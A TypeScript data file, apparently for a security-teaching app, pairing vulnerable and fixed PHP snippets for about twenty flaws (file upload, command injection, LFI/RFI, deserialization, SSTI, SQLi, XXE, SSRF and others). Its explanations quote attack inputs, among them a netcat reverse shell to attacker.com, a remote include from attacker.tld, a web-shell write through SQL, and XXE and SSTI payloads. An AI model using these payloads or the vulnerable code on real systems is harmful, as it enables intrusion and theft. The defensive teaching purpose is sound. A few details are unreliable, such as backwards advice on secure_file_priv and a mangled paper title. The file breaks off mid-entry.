import { Severity, VulnType, type Vulnerability } from "@/types";

export const vulnerabilities: Vulnerability[] = [
  {
    id: "unrestricted-file-upload",
    name: "Unrestricted File Upload",
    cwe: 434,
    severity: Severity.CRITICAL,
    type: VulnType.FILE_UPLOAD,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "An upload handler trusts the client-supplied filename/extension or MIME type and stores the file inside a web-accessible directory, letting an attacker drop a PHP script that the server will later execute.",
    vulnerableCode: `<?php
// upload.php
$target = __DIR__ . '/uploads/' . $_FILES['avatar']['name'];
move_uploaded_file($_FILES['avatar']['tmp_name'], $target);
echo "Uploaded to $target";`,
    secureCode: `<?php
// upload.php
$allowed = ['image/png' => 'png', 'image/jpeg' => 'jpg'];
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($_FILES['avatar']['tmp_name']);

if (!isset($allowed[$mime])) {
    http_response_code(400);
    exit('Unsupported file type');
}

$name   = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
$target = '/var/app/uploads_private/' . $name; // outside webroot

move_uploaded_file($_FILES['avatar']['tmp_name'], $target);
echo "Stored as $name";`,
    explanation:
      "The vulnerable handler never validates file content, only trusts the attacker-controlled original filename, and writes into a directory the web server can execute scripts from. An attacker uploads shell.php (or shell.php.jpg, shell.phtml, etc. depending on server config) and requests it directly to get code execution.",
    mitigation: [
      "Validate actual file content (magic bytes / finfo), never the client-supplied name or MIME header",
      "Generate a random server-side filename; never reuse the uploaded name",
      "Store uploads outside the webroot, or in a directory with PHP execution disabled",
      "Set a strict allow-list of extensions and re-check after any decompression/processing",
      "Serve uploaded files through a script that sets Content-Disposition and a safe Content-Type",
    ],
    tags: ["upload", "rce", "web-shell"],
    cvss: 9.8,
    references: [
      { title: "OWASP: Unrestricted File Upload", url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" },
      { title: "CWE-434", url: "https://cwe.mitre.org/data/definitions/434.html" },
    ],
  },
  {
    id: "os-command-injection-shell-exec",
    name: "OS Command Injection via shell_exec()",
    cwe: 78,
    severity: Severity.CRITICAL,
    type: VulnType.COMMAND_INJECTION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2", "8.3"],
    description:
      "User input is concatenated directly into a shell command string passed to shell_exec(), system(), exec(), or passthru(), allowing shell metacharacters to inject arbitrary commands.",
    vulnerableCode: `<?php
// ping.php
$host = $_GET['host'];
$output = shell_exec("ping -c 4 " . $host);
echo "<pre>$output</pre>";`,
    secureCode: `<?php
// ping.php
$host = $_GET['host'] ?? '';

if (!filter_var($host, FILTER_VALIDATE_IP) &&
    !preg_match('/^[a-zA-Z0-9.-]{1,253}$/', $host)) {
    http_response_code(400);
    exit('Invalid host');
}

$output = shell_exec('ping -c 4 ' . escapeshellarg($host));
echo '<pre>' . htmlspecialchars($output ?? '') . '</pre>';`,
    explanation:
      "Because the host parameter is concatenated unescaped, an attacker can submit `8.8.8.8; cat /etc/passwd` or `8.8.8.8 | nc attacker.com 4444 -e /bin/sh` to chain additional commands. Shell metacharacters (`;`, `|`, `&&`, backticks, `$()`) all work. The www-data (or equivalent) user then executes the attacker's command.",
    mitigation: [
      "Avoid shell functions entirely when a native PHP API exists (e.g. use the Sockets/DNS extensions instead of shelling out to ping)",
      "If shelling out is unavoidable, validate input against a strict allow-list before use",
      "Always wrap arguments with escapeshellarg(), and the command itself with escapeshellcmd()",
      "Run the web server process as a low-privilege, sandboxed user",
      "Disable shell_exec, exec, system, passthru, popen, proc_open via disable_functions in php.ini on hosts that don't need them",
    ],
    tags: ["command-injection", "rce", "shell_exec"],
    cvss: 9.8,
    references: [
      { title: "OWASP: Command Injection", url: "https://owasp.org/www-community/attacks/Command_Injection" },
      { title: "CWE-78", url: "https://cwe.mitre.org/data/definitions/78.html" },
    ],
  },
  {
    id: "local-file-inclusion",
    name: "Local File Inclusion (LFI)",
    cwe: 98,
    severity: Severity.CRITICAL,
    type: VulnType.LFI_RFI,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "A page parameter controls which file is include()'d or require()'d. Combined with path traversal or null-byte tricks (legacy PHP), or log/session poisoning, this leads to arbitrary code execution.",
    vulnerableCode: `<?php
// router.php
$page = $_GET['page'] ?? 'home';
include $page . '.php';`,
    secureCode: `<?php
// router.php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $allowed, true)) {
    http_response_code(404);
    exit('Not found');
}

require __DIR__ . '/pages/' . $page . '.php';`,
    explanation:
      "Without an allow-list, `?page=../../../../etc/passwd%00` (on very old PHP with null-byte support) or `?page=php://filter/convert.base64-encode/resource=config` discloses source. On systems where the attacker can influence a log file (e.g. inject PHP into their User-Agent, then include the access log), LFI escalates straight to RCE because PHP executes whatever the included file contains.",
    mitigation: [
      "Never pass user input directly into include/require; map it through a hard-coded allow-list",
      "Disable allow_url_include and allow_url_fopen unless explicitly required",
      "Keep includable files outside any directory an attacker can write to (uploads, logs, session files)",
      "Use basename() plus a fixed directory and extension when a dynamic template name is unavoidable",
    ],
    tags: ["lfi", "rce", "include"],
    cvss: 9.1,
    references: [
      { title: "OWASP: Path Traversal", url: "https://owasp.org/www-community/attacks/Path_Traversal" },
      { title: "CWE-98", url: "https://cwe.mitre.org/data/definitions/98.html" },
    ],
  },
  {
    id: "remote-file-inclusion",
    name: "Remote File Inclusion (RFI)",
    cwe: 98,
    severity: Severity.CRITICAL,
    type: VulnType.LFI_RFI,
    phpVersions: ["7.4", "8.0"],
    description:
      "With allow_url_include enabled, an include()/require() that accepts a URL lets an attacker host PHP code on their own server and have the victim fetch and execute it directly.",
    vulnerableCode: `<?php
// template.php
$tpl = $_GET['tpl'];
include $tpl; // e.g. ?tpl=http://attacker.tld/shell.txt`,
    secureCode: `<?php
// template.php
$templates = ['default', 'dark', 'print'];
$tpl = $_GET['tpl'] ?? 'default';

if (!in_array($tpl, $templates, true)) {
    $tpl = 'default';
}

require __DIR__ . "/templates/{$tpl}.php";`,
    explanation:
      "RFI requires allow_url_include=On (off by default since PHP 5.2) but is still found on misconfigured legacy hosts or shared hosting. Once enabled, including a remote URL downloads and executes arbitrary PHP, handing the attacker full code execution with no local file write needed.",
    mitigation: [
      "Keep allow_url_include=Off (the modern default) — never re-enable it",
      "Treat any dynamic include/require path as attacker input and validate against an allow-list",
      "Use a Content-Security-Policy and egress filtering to limit outbound connections from app servers",
    ],
    tags: ["rfi", "rce", "legacy"],
    cvss: 9.8,
    references: [{ title: "PHP Manual: allow_url_include", url: "https://www.php.net/manual/en/filesystem.configuration.php" }],
  },
  {
    id: "phar-deserialization",
    name: "PHAR Deserialization (phar:// RCE)",
    cwe: 502,
    severity: Severity.CRITICAL,
    type: VulnType.DESERIALIZATION,
    phpVersions: ["7.4", "8.0", "8.1"],
    description:
      "Passing attacker-controlled data to filesystem functions (file_exists, getimagesize, fopen, etc.) with the phar:// stream wrapper triggers PHP to unserialize the Phar's metadata, invoking any __wakeup()/__destruct() gadgets available in the codebase — without ever calling unserialize() directly.",
    vulnerableCode: `<?php
// avatar check — looks harmless, no unserialize() in sight
$path = $_POST['avatar_path'];
if (file_exists($path)) {
    echo getimagesize($path)[0];
}`,
    secureCode: `<?php
$path = $_POST['avatar_path'] ?? '';

// Reject stream wrappers outright; only allow plain local paths
if (preg_match('#^[a-z]+://#i', $path)) {
    http_response_code(400);
    exit('Invalid path');
}

$real = realpath($path);
$base = realpath(__DIR__ . '/uploads');

if ($real === false || !str_starts_with($real, $base)) {
    http_response_code(400);
    exit('Invalid path');
}

if (file_exists($real)) {
    echo getimagesize($real)[0];
}`,
    explanation:
      "A crafted .phar file (renamed to .jpg, it still parses as PHAR once a stream wrapper touches it) stores a serialized PHP object in its metadata. When any filesystem function receives `phar://uploads/evil.jpg/x`, PHP unserializes that metadata. If any class reachable by autoloading has a __wakeup() or __destruct() with dangerous side effects (a classic 'POP chain' gadget, e.g. in a framework or ORM), it executes during unserialization — full RCE with no explicit unserialize() call in the vulnerable file.",
    mitigation: [
      "Never pass user-controlled strings to filesystem functions without validating against stream-wrapper prefixes",
      "Use realpath() + a strict base-directory prefix check before any file operation",
      "Keep dependencies patched — gadget chains rely on specific library classes",
      "Where possible, use is_file() checks bound to already-resolved absolute paths rather than raw input",
    ],
    tags: ["deserialization", "phar", "rce", "gadget-chain"],
    cvss: 8.8,
    cve: "CVE-2018-20783 (example ecosystem gadget)",
    references: [
      { title: "Sam Thomas: It's a PHP, It's a Shell, It's Superfishal", url: "https://www.blackhat.com/docs/us-18/Thursday/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf" },
    ],
  },
  {
    id: "unsafe-unserialize",
    name: "Unsafe unserialize() / Object Injection",
    cwe: 502,
    severity: Severity.CRITICAL,
    type: VulnType.DESERIALIZATION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "Calling unserialize() on attacker-controlled input (cookies, cache values, session data) lets the attacker instantiate arbitrary classes already loaded by the application, triggering __wakeup()/__destruct() gadget chains that can lead to file writes, SSRF, or RCE.",
    vulnerableCode: `<?php
// cart.php
$cart = unserialize($_COOKIE['cart']);
foreach ($cart as $item) {
    echo $item->name;
}`,
    secureCode: `<?php
// cart.php
$raw = $_COOKIE['cart'] ?? '';
$cart = json_decode($raw, true);

if (!is_array($cart)) {
    $cart = [];
}

foreach ($cart as $item) {
    echo htmlspecialchars($item['name'] ?? '');
}`,
    explanation:
      "unserialize() will happily build any class instance described in the serialized string, calling that class's magic methods during construction/destruction. If the application (or a loaded library) has a class whose __destruct() deletes a file, makes an HTTP request, or runs a query based on object properties, the attacker fully controls those properties — a textbook PHP Object Injection (POI) gadget chain.",
    mitigation: [
      "Prefer json_encode()/json_decode() for any data crossing a trust boundary (cookies, cache, query params)",
      "If unserialize() is unavoidable, pass `['allowed_classes' => false]` (or an explicit allow-list) as the second argument",
      "Audit dependencies for dangerous magic methods; keep them patched",
      "Sign or encrypt serialized data stored client-side (cookies) so tampering is detected before it is ever deserialized",
    ],
    tags: ["deserialization", "object-injection", "rce"],
    cvss: 8.1,
    references: [
      { title: "PHP Manual: unserialize()", url: "https://www.php.net/manual/en/function.unserialize.php" },
      { title: "CWE-502", url: "https://cwe.mitre.org/data/definitions/502.html" },
    ],
  },
  {
    id: "twig-ssti",
    name: "Server-Side Template Injection (Twig)",
    cwe: 1336,
    severity: Severity.CRITICAL,
    type: VulnType.TEMPLATE_INJECTION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "User input is rendered as template source (rather than passed as template data), letting an attacker inject Twig syntax that calls into PHP functions or reads server-side variables.",
    vulnerableCode: `<?php
// welcome.php
$name = $_GET['name'] ?? 'Guest';
echo $twig->createTemplate("Hello, {$name}!")->render();`,
    secureCode: `<?php
// welcome.php
$name = $_GET['name'] ?? 'Guest';

// Compile the template ONCE from a static file; pass user data
// only as a render-time variable, never as template source.
echo $twig->render('welcome.html.twig', ['name' => $name]);`,
    explanation:
      "createTemplate() compiles whatever string you give it as a template. An attacker supplying `{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}` (depending on sandbox/version) can reach PHP callables and execute commands. The fix is architectural: user data must only ever flow into `render()`'s variable array, never into the template string itself.",
    mitigation: [
      "Never build template source strings from user input — only pass user data as render variables",
      "Enable Twig's sandbox extension with a strict allow-list of tags/filters/functions if dynamic templates are required",
      "Keep templating engines patched; SSTI sandboxes have had their own bypasses",
      "Apply output encoding appropriate to context even after rendering",
    ],
    tags: ["ssti", "twig", "rce"],
    cvss: 9.0,
    references: [{ title: "PortSwigger: Server-side template injection", url: "https://portswigger.net/web-security/server-side-template-injection" }],
  },
  {
    id: "eval-injection",
    name: "Code Injection via eval()",
    cwe: 95,
    severity: Severity.CRITICAL,
    type: VulnType.INJECTION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "Passing user input to eval() executes it as PHP code directly — the most direct code-injection primitive PHP offers.",
    vulnerableCode: `<?php
// calc.php
$expr = $_GET['expr']; // intended: simple arithmetic like "2+2"
echo eval("return $expr;");`,
    secureCode: `<?php
// calc.php
$expr = $_GET['expr'] ?? '';

if (!preg_match('/^[0-9+\\-*\\/().\\s]+$/', $expr)) {
    http_response_code(400);
    exit('Invalid expression');
}

// Use a real expression parser/evaluator library instead of eval().
echo (new ExpressionEvaluator())->evaluate($expr);`,
    explanation:
      "`eval(\"return $expr;\")` with `expr = \"1; system('id'); //\"` runs `system('id')` with full PHP privileges. There is no safe way to sandbox eval() of attacker-controlled strings in PHP — any solution that works reliably amounts to writing (or using) a dedicated non-Turing-complete expression parser.",
    mitigation: [
      "Never pass user input to eval(), assert() (pre-PHP 8), or create_function()",
      "Use a dedicated math/expression-parsing library for calculator-style features",
      "Add eval to disable_functions in php.ini where the application has no legitimate use for it",
    ],
    tags: ["eval", "rce", "code-injection"],
    cvss: 9.8,
    references: [{ title: "CWE-95", url: "https://cwe.mitre.org/data/definitions/95.html" }],
  },
  {
    id: "sql-injection-classic",
    name: "SQL Injection (string concatenation)",
    cwe: 89,
    severity: Severity.HIGH,
    type: VulnType.SQL_INJECTION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2", "8.3"],
    description:
      "A query is built by concatenating user input into SQL text instead of using parameterized queries, allowing classic UNION-based or boolean-based injection — and, on some stacks, follow-on file writes via INTO OUTFILE that drop a web shell.",
    vulnerableCode: `<?php
// search.php
$term = $_GET['q'];
$sql = "SELECT id, title FROM articles WHERE title LIKE '%$term%'";
$result = mysqli_query($conn, $sql);`,
    secureCode: `<?php
// search.php
$term = $_GET['q'] ?? '';
$stmt = $conn->prepare(
    "SELECT id, title FROM articles WHERE title LIKE CONCAT('%', ?, '%')"
);
$stmt->bind_param('s', $term);
$stmt->execute();
$result = $stmt->get_result();`,
    explanation:
      "An attacker submitting `' UNION SELECT user(),@@version-- -` reads database metadata; with FILE privilege, `' UNION SELECT '<?php system($_GET[1]); ?>',1 INTO OUTFILE '/var/www/html/shell.php'-- -` writes a PHP web shell straight into the webroot, converting a database flaw into full shell access.",
    mitigation: [
      "Always use prepared statements / parameterized queries (PDO or mysqli with bound params)",
      "Apply least privilege to the DB account the app uses (no FILE, no SUPER)",
      "Disable secure_file_priv or point it somewhere non-web-accessible on MySQL/MariaDB",
      "Run a WAF/IDS rule set as a defense-in-depth layer, not a substitute for parameterization",
    ],
    tags: ["sql-injection", "database", "rce-chain"],
    cvss: 8.6,
    references: [{ title: "OWASP: SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" }],
  },
  {
    id: "path-traversal-download",
    name: "Path Traversal in File Download Endpoint",
    cwe: 22,
    severity: Severity.HIGH,
    type: VulnType.PATH_TRAVERSAL,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "A download endpoint builds a filesystem path from a user-supplied filename without normalizing or restricting it, letting `../` sequences escape the intended directory.",
    vulnerableCode: `<?php
// download.php
$file = $_GET['file'];
readfile(__DIR__ . '/files/' . $file);`,
    secureCode: `<?php
// download.php
$file = basename($_GET['file'] ?? '');
$base = __DIR__ . '/files/';
$path = realpath($base . $file);

if ($path === false || !str_starts_with($path, realpath($base) . DIRECTORY_SEPARATOR)) {
    http_response_code(404);
    exit('Not found');
}

readfile($path);`,
    explanation:
      "`?file=../../../../etc/passwd` or Windows-style `..\\..\\..\\windows\\win.ini` escapes the files/ directory entirely. Combined with knowledge of the app's own config file locations, this discloses database credentials, API keys, or source code that enables further attacks.",
    mitigation: [
      "Strip directory components with basename() before building any path from user input",
      "Resolve the final path with realpath() and verify it is still inside the intended base directory",
      "Prefer an indirect reference (a database ID mapped server-side to a real path) over passing filenames directly",
    ],
    tags: ["path-traversal", "disclosure"],
    cvss: 7.5,
    references: [{ title: "CWE-22", url: "https://cwe.mitre.org/data/definitions/22.html" }],
  },
  {
    id: "xxe-simplexml",
    name: "XML External Entity (XXE) Injection",
    cwe: 611,
    severity: Severity.HIGH,
    type: VulnType.XXE,
    phpVersions: ["7.4", "8.0"],
    description:
      "Parsing attacker-supplied XML without disabling DOCTYPE/external-entity resolution lets an attacker read local files or trigger SSRF through crafted ENTITY declarations.",
    vulnerableCode: `<?php
// import.php
$dom = new DOMDocument();
$dom->loadXML($_POST['data']); // DTD + external entities resolved by default
echo $dom->getElementsByTagName('title')->item(0)->nodeValue;`,
    secureCode: `<?php
// import.php
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;

libxml_use_internal_errors(true);
libxml_disable_entity_loader(true); // no-op on PHP 8+, but harmless

$ok = $dom->loadXML($_POST['data'] ?? '', LIBXML_NONET | LIBXML_NOENT ^ LIBXML_NOENT);

if (!$ok || $dom->doctype !== null) {
    http_response_code(400);
    exit('Invalid document');
}

echo htmlspecialchars($dom->getElementsByTagName('title')->item(0)?->nodeValue ?? '');`,
    explanation:
      "A payload like `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>` makes libxml substitute the entity with the contents of /etc/passwd before the app ever sees the parsed value. The same technique can target internal-only HTTP endpoints (SSRF) by pointing the SYSTEM identifier at an internal URL.",
    mitigation: [
      "Reject any document containing a DOCTYPE declaration outright before parsing further",
      "Never enable substituteEntities / resolveExternals on untrusted input",
      "Use LIBXML_NONET to block network-based entity resolution as defense in depth",
      "Prefer a data format without this class of risk (JSON) when external entities serve no purpose",
    ],
    tags: ["xxe", "xml", "ssrf", "disclosure"],
    cvss: 7.1,
    references: [{ title: "OWASP: XXE Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" }],
  },
  {
    id: "ssrf-url-fetch",
    name: "Server-Side Request Forgery (SSRF) via URL Fetch",
    cwe: 918,
    severity: Severity.HIGH,
    type: VulnType.SSRF,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "A feature that fetches a user-supplied URL (avatar-from-URL, webhook tester, PDF renderer) does not restrict the target, letting an attacker reach internal services, cloud metadata endpoints, or the loopback interface.",
    vulnerableCode: `<?php
// fetch_avatar.php
$url = $_POST['url'];
$image = file_get_contents($url);
file_put_contents('avatars/' . uniqid() . '.jpg', $image);`,
    secureCode: `<?php
// fetch_avatar.php
$url = $_POST['url'] ?? '';
$parts = parse_url($url);

$blockedHosts = ['169.254.169.254', 'localhost', '127.0.0.1', '::1'];
if (($parts['scheme'] ?? '') !== 'https'
    || in_array(strtolower($parts['host'] ?? ''), $blockedHosts, true)
    || filter_var(gethostbyname($parts['host'] ?? ''), FILTER_VALIDATE_IP) === false) {
    http_response_code(400);
    exit('URL not allowed');
}

$ctx = stream_context_create(['http' => ['timeout' => 3, 'follow_location' => 0]]);
$image = file_get_contents($url, false, $ctx);
file_put_contents('avatars/' . bin2hex(random_bytes(8)) . '.jpg', $image);`,
    explanation:
      "Pointing the URL at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` on a cloud VM can leak IAM credentials; pointing it at `http://127.0.0.1:6379/` can probe or speak to internal services that were never meant to be internet-reachable. Redirects (a 302 to an internal address) also bypass naive scheme/host checks unless follow_location is disabled.",
    mitigation: [
      "Resolve the hostname and block private/loopback/link-local ranges and the cloud metadata address before connecting",
      "Disable HTTP redirect following, or re-validate the destination after each hop",
      "Restrict to an explicit allow-list of destination hosts where the use case allows it",
      "Run the fetch from a network-isolated egress proxy with its own firewall rules",
    ],
    tags: ["ssrf", "cloud-metadata", "network"],
    cvss: 8.6,
    references: [{ title: "OWASP: SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" }],
  },
  {
    id: "insecure-deserialize-session",
    name: "PHP Type Juggling in Authentication Check",
    cwe: 697,
    severity: Severity.MEDIUM,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0"],
    description:
      "Loose comparison (==) between a stored hash/token and user input lets PHP's type-juggling rules treat specially crafted strings as equal, bypassing the check entirely.",
    vulnerableCode: `<?php
// reset.php
$stored = '0e123456789'; // a hash that happens to look numeric in scientific notation
$supplied = $_POST['token'];
if ($stored == $supplied) {
    // treated as 0 == 0 if $supplied is also a "0e..." numeric string
    grantPasswordReset();
}`,
    secureCode: `<?php
// reset.php
$stored = '0e123456789';
$supplied = $_POST['token'] ?? '';

if (hash_equals($stored, $supplied)) {
    grantPasswordReset();
}`,
    explanation:
      "PHP's == operator converts both operands to numbers when both strings look numeric. Two different \"0e<digits>\" strings both evaluate to 0 == 0 and compare equal even though the strings differ, letting an attacker guess a trivially matching token instead of brute-forcing the real one.",
    mitigation: [
      "Use hash_equals() for any comparison involving secrets, tokens, or MACs — it is also timing-safe",
      "Use === instead of == whenever comparing values that are not guaranteed to be the same type",
      "Avoid storing hashes in formats that happen to parse as scientific-notation numbers where feasible",
    ],
    tags: ["type-juggling", "auth-bypass"],
    cvss: 6.5,
    references: [{ title: "PHP Manual: Comparison Operators", url: "https://www.php.net/manual/en/language.operators.comparison.php" }],
  },
  {
    id: "disable-functions-bypass-ld-preload",
    name: "disable_functions Bypass via Crafted Extension / LD_PRELOAD",
    cwe: 693,
    severity: Severity.HIGH,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0", "8.1"],
    description:
      "disable_functions blocks calling shell_exec/system/exec directly from PHP userland, but if an attacker can also control an environment variable such as PHP's mail() sendmail path, or upload a malicious PHP extension, the restriction can be sidestepped at a lower level.",
    vulnerableCode: `; php.ini
disable_functions = exec,system,shell_exec,passthru,popen,proc_open
; but mail() is still enabled and the attacker can influence
; the "sendmail_path" indirectly via a writable .user.ini`,
    secureCode: `; php.ini (defense in depth, applied at the pool/server level, not just php.ini)
disable_functions = exec,system,shell_exec,passthru,popen,proc_open,pcntl_exec
disable_classes =
open_basedir = /var/www/app:/tmp
user_ini.filename =        ; disable .user.ini overrides entirely
mail.add_x_header = Off
; plus: run PHP-FPM under a dedicated, non-writable-by-upload-dir user,
; and mount the webroot read-only with a separate writable uploads volume.`,
    explanation:
      "disable_functions is a single layer, not a sandbox boundary. Historical bypasses have used mail()'s sendmail integration, Apache's mod_cgi fallback, LD_PRELOAD injected through crafted session/upload files read by a vulnerable SAPI, or an attacker-writable .user.ini re-enabling functions in a specific directory. Relying on disable_functions alone, without open_basedir, a read-only webroot, and least-privilege process isolation, leaves an escape path.",
    mitigation: [
      "Pair disable_functions with open_basedir and disable_classes",
      "Disable .user.ini processing (or at least make the webroot non-writable by the PHP process)",
      "Run PHP-FPM/Apache workers as a user with no write access to the directories it serves",
      "Treat disable_functions as defense-in-depth, not a substitute for fixing the actual injection vulnerability",
    ],
    tags: ["hardening", "bypass", "misconfiguration"],
    cvss: 7.8,
    references: [{ title: "PHP Manual: disable_functions", url: "https://www.php.net/manual/en/ini.core.php#ini.disable-functions" }],
  },
  {
    id: "insecure-phpinfo-exposure",
    name: "Exposed phpinfo() / Debug Endpoint",
    cwe: 200,
    severity: Severity.MEDIUM,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2", "8.3"],
    description:
      "A leftover phpinfo(), debug route, or verbose error page discloses the full PHP configuration, loaded extensions, environment variables, and absolute file system paths — reconnaissance that materially speeds up every other attack on this list.",
    vulnerableCode: `<?php
// debug.php — left in production by mistake
phpinfo();`,
    secureCode: `<?php
// debug.php
if (($_ENV['APP_ENV'] ?? 'production') !== 'local') {
    http_response_code(404);
    exit;
}

phpinfo();
// Better still: delete this file entirely before deploying,
// and block *.php files under any /debug or /tools path at the web server.`,
    explanation:
      "phpinfo() prints disable_functions, open_basedir, loaded modules (so an attacker knows exactly which gadget chains might apply), include paths, and sometimes environment variables containing secrets. It is rarely exploitable on its own but reliably shortens every subsequent attack's reconnaissance phase.",
    mitigation: [
      "Never deploy phpinfo() or framework debug/profiler routes to production",
      "Gate any diagnostic endpoint behind an environment check and authentication",
      "Set display_errors=Off and expose_php=Off in production php.ini",
      "Add CI checks that fail the build if debug routes or phpinfo() calls are present",
    ],
    tags: ["information-disclosure", "misconfiguration", "recon"],
    cvss: 5.3,
    references: [{ title: "CWE-200", url: "https://cwe.mitre.org/data/definitions/200.html" }],
  },
  {
    id: "insecure-session-fixation",
    name: "Session Fixation via Unregenerated Session ID",
    cwe: 384,
    severity: Severity.MEDIUM,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0", "8.1"],
    description:
      "The application accepts a session ID supplied before login and keeps using it after authentication instead of regenerating it, letting an attacker who planted a known session ID in the victim's browser hijack the now-authenticated session.",
    vulnerableCode: `<?php
// login.php
session_start();
if (checkCredentials($_POST['user'], $_POST['pass'])) {
    $_SESSION['user_id'] = getUserId($_POST['user']);
    // session ID from before login is reused unchanged
}`,
    secureCode: `<?php
// login.php
session_start();
if (checkCredentials($_POST['user'], $_POST['pass'])) {
    session_regenerate_id(true); // issue a fresh ID, destroy the old session
    $_SESSION['user_id'] = getUserId($_POST['user']);
}`,
    explanation:
      "If session IDs are accepted from the URL/cookie before authentication (session.use_strict_mode off, or the app explicitly honors a passed-in ID), an attacker can send the victim a link containing a chosen session ID. Once the victim logs in, that same ID becomes authenticated, and the attacker — who already knows it — can use it too.",
    mitigation: [
      "Call session_regenerate_id(true) immediately after any privilege change (login, role elevation)",
      "Enable session.use_strict_mode and use cookie-only session transport (session.use_only_cookies)",
      "Set Secure, HttpOnly, and SameSite attributes on the session cookie",
    ],
    tags: ["session", "auth", "fixation"],
    cvss: 6.1,
    references: [{ title: "OWASP: Session Management Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" }],
  },
  {
    id: "insecure-direct-object-reference",
    name: "Insecure Direct Object Reference (IDOR) on Invoice Download",
    cwe: 639,
    severity: Severity.HIGH,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "A resource is fetched by a sequential ID with no ownership check, letting any authenticated user view or download another user's data simply by changing the ID in the URL.",
    vulnerableCode: `<?php
// invoice.php
session_start();
$id = $_GET['id'];
$invoice = $db->query("SELECT * FROM invoices WHERE id = $id")->fetch();
echo renderInvoice($invoice);`,
    secureCode: `<?php
// invoice.php
session_start();
$id = (int) ($_GET['id'] ?? 0);

$stmt = $db->prepare('SELECT * FROM invoices WHERE id = ? AND user_id = ?');
$stmt->execute([$id, $_SESSION['user_id']]);
$invoice = $stmt->fetch();

if (!$invoice) {
    http_response_code(404);
    exit('Not found');
}

echo renderInvoice($invoice);`,
    explanation:
      "Because the query never checks that the invoice belongs to the logged-in user, `?id=1042` works for any authenticated session regardless of whose invoice it is. This class of bug is purely a missing-authorization-check issue; it is not caught by input validation or escaping because the SQL itself is syntactically safe.",
    mitigation: [
      "Always scope resource lookups to the authenticated user (or check ownership/role explicitly after fetching)",
      "Prefer non-sequential, unguessable identifiers (UUIDs) for resources referenced in URLs as a secondary layer",
      "Write authorization tests that assert cross-tenant access is denied, not just that valid access works",
    ],
    tags: ["idor", "authorization", "broken-access-control"],
    cvss: 7.1,
    references: [{ title: "OWASP: IDOR", url: "https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" }],
  },
  {
    id: "insecure-cors-wildcard",
    name: "Overly Permissive CORS Configuration",
    cwe: 942,
    severity: Severity.MEDIUM,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0", "8.1", "8.2"],
    description:
      "An API reflects the request's Origin header back in Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true, letting any website read authenticated API responses on behalf of a logged-in victim who visits it.",
    vulnerableCode: `<?php
// api.php
header('Access-Control-Allow-Origin: ' . ($_SERVER['HTTP_ORIGIN'] ?? '*'));
header('Access-Control-Allow-Credentials: true');`,
    secureCode: `<?php
// api.php
$allowed = ['https://app.example.com', 'https://admin.example.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowed, true)) {
    header("Access-Control-Allow-Origin: $origin");
    header('Access-Control-Allow-Credentials: true');
    header('Vary: Origin');
}`,
    explanation:
      "Reflecting any Origin while allowing credentials effectively disables the browser's same-origin protections for this endpoint: a page on attacker.tld can fetch() the API with the victim's cookies attached and read the JSON response cross-origin, exfiltrating private data without any traditional 'vulnerability' in the request handling itself.",
    mitigation: [
      "Maintain an explicit allow-list of origins; never reflect Origin unconditionally",
      "Only set Allow-Credentials: true for origins that genuinely need cookie-based auth",
      "Add Vary: Origin so caches don't serve one origin's CORS headers to another",
      "Prefer token-based auth (Authorization header) over cookies for cross-origin APIs where feasible",
    ],
    tags: ["cors", "misconfiguration", "data-exposure"],
    cvss: 6.5,
    references: [{ title: "PortSwigger: CORS misconfigurations", url: "https://portswigger.net/web-security/cors" }],
  },
  {
    id: "weak-random-token",
    name: "Predictable Password Reset Token (weak RNG)",
    cwe: 338,
    severity: Severity.HIGH,
    type: VulnType.MISCONFIGURATION,
    phpVersions: ["7.4", "8.0", "8.1"],
    description:
      "A password-reset or API token is generated with a non-cryptographic source (rand(), mt_rand(), uniqid(), or a hash of a predictable seed), letting an attacker predict or brute-force valid tokens.",
    vulnerableCode: `<?php
// forgot_password.php
$token = md5(uniqid((string) mt_rand(), true));
storeResetToken($userId, $token);`,
    secureCode: `<?php
// forgot_password.php
$token = bin2hex(random_bytes(32)); // CSPRNG, 256 bits of entropy
storeResetToken($userId, hash('sha256', $token)); // store only the hash
// email the raw $token to the user; compare with hash_equals() on redemption`,
    explanation:
